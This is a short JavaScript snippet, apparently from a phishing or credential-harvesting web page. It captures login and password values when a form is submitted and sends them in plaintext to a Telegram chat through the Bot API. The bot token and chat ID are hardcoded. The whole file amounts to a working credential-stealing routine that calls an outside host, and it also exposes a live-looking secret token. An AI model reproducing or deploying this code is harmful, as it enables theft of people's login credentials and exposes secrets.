const form = document.querySelector('form')

let bot = {
	TOKEN: "5260298302:AAHqKPUaAyIHq5Z1q-VWNBUajXzSsjFLUE4",
	chatID: "-749947677",

}


form.addEventListener("submit", (e)=>{
	e.preventDefault()
	const login = document.querySelector('.login')
	const password = document.querySelector('.password')

	fetch(` https://api.telegram.org/bot${bot.TOKEN}/sendMessage?chat_id=${bot.chatID}&text=${"Login: " + login.value + "  Parol: " + password.value}`,{
		method: 'GET'
	})
	.then(success => {
		alert("Message send successfully")
	},error =>{
		alert("message not send")
		console.log(error);
	})
})